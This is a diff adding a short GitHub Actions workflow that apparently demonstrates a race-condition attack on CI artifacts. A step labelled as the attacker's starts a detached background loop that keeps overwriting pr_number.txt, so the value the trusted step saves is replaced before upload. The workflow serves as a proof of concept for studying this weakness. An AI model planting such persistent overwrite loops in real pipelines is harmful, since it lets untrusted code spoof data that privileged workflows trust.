@@ -1,0 +1,16 @@
+name: race-test
+on: push
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: attacker step starts background overwrite loop
+        run: |
+          setsid bash -c 'while true; do echo VICTIM_9999 > pr_number.txt; sleep 0.1; done' >/dev/null 2>&1 &
+          echo "bg loop started"
+      - name: trusted save PR number (one-shot)
+        run: echo OWN_1 > pr_number.txt
+      - name: simulate later steps
+        run: sleep 4
+      - name: what upload would read
+        run: echo "pr_number.txt at upload time:"; cat pr_number.txt
